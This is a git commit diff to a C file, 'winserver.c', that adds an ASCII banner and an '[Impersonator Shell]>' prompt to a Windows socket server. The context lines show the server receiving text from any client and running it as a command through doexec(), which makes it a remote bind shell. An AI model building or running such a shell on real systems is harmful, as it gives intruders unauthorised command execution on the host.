fda1c0766990173e242d5cb317117fdee2f82c03
AleksaZatezalo <zabumaphu@gmail.com>
2024-09-12 00:23:13 -0500

    Header added again.

--- winserver.c
+++ winserver.c
@@ -3,6 +3,31 @@
 #include <stdio.h>
 #include "doexec.h"
 
+/*
+* String IO Functions
+*/
+int header(int sockfd){
+
+    /*print Impersonator*/
+    char *print_this = " ~|~ _ _  _  _  _ _ _  _  _ _|_ _  _\r\n _|_| | ||_)(/_| _\\(_)| |(_| | (_)|\n        |    \n";
+    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
+    
+    /*print Shell*/
+    char *print_that = "\r\n\t\t (~|_  _ ||\n\t\t _)| |(/_||\r\n\r\nBy Aleksa Zatezalo";
+    send(sockfd, print_that, sizeof(char) * strlen(print_that), 0);
+
+    return 0;
+}
+
+int command_prompt(int sockfd){
+
+    /*print Impersonator*/
+    char *print_this = "\n[Impersonator Shell]>";
+    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
+    
+    return 0;
+}
+
 int main()
 {
     WSADATA WSAData;
@@ -26,6 +51,8 @@ int main()
     while((client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize)) != INVALID_SOCKET)
     {
         printf("            Client connected!\n");
+        header(client);
+        command_prompt(client);
         recv(client, buffer, sizeof(buffer), 0);
         char *ans = doexec(buffer);
         send(client, ans, strlen(ans) * sizeof(char),0);
